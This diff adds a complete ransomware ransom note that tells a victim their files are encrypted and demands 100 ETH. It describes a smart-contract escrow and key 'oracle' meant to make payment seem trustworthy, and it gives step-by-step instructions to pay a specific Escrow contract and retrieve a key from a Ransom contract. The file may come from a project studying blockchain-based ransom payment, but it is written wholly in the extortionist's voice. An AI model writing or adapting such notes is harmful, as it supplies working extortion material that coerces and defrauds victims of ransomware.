@@ -1,0 +1,26 @@
+I have taken all of your files hostage using the best encryption technology.
+You can get them back with a payment of 100 ETH.
+
+So you may understand that payment is the wisest and only choice I will
+explain.  The payment process uses smart contract technology and I have
+provided you all of my source code which you can confirm on the blockchain to
+be sure that you will receive the decryption key when you pay.  The only code I
+have not given to you is the "oracle" that stores the keys.  It watches the
+blockchain and will provide the key when it sees a payment with an accompanying
+file that is correctly encrypted.  Any of your locked files will work.  If you
+try to provide the wrong file or do not pay, you will not get the key.  But I also
+will refund your money if the file does not decrypt.  So this is a fair exchange.
+
+You can even see on the blockchain that others have paid and unlocked their
+files.  You can trust this technology.
+
+To receive the decryption key for your files:
+1. make a transaction to the payRansom(...) function of the Escrow contract at address: 0x0bb8D9a961cF6789244130f6C4f922C414Fde651
+   - include value (payment) of 100 ETH
+   - include your unique identification value: 0xb05d1d5c69459b0ef424a213f1c11d0afd53d070df8b69ac041584c3af9dba8c
+
+Then, after the oracle confirms and deposits your decryption key, it may be
+retrieved by reading the blockchain with:
+
+2. "call" the getDecryptionKey() function of your unique Ransom contract at address: 0x688eEaD6Fd95c6b8041066Bed4cAC4F795d7B445
+
